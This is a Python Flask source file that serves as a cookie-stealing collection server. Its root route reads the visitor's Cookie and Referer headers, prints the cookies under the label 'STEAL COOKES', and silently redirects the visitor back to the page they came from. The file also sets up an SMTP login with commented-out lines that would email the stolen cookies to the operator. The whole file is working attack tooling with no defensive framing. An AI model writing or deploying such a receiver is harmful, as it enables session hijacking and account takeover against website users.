import os
import requests
import smtplib

from dotenv import load_dotenv
from flask import Flask, request, Response, redirect


load_dotenv()


app = Flask(__name__)


def start_smtp():
    smtp_data = os.getenv('MAIL_HOST').split(':')
    host = smtp_data[0]
    port = int(smtp_data[1])
    addr = os.getenv('MAIL_LOGIN')
    passwd = os.getenv('MAIL_PASS')

    server = smtplib.SMTP(host, port)
    server.starttls()
    server.login(addr, passwd)
    print('[+] SMTP Server started')
    return server
 

SMTP_SERVER = start_smtp()


@app.route('/', methods=['POST', 'GET'])
def send_mail():
    back_url = request.__dict__['environ']['HTTP_REFERER']
    cookies = request.__dict__['environ']['HTTP_COOKIE']
    print(f'\n----\n[+] STEAL COOKES: {cookies}\n----')
    
    addr = os.getenv('MAIL_LOGIN')

    # SMTP_SERVER.sendmail(to_addrs=addr, from_addr=addr, msg=cookies)
    # print(f'[+] Message sent to {addr}')
    return redirect(back_url)
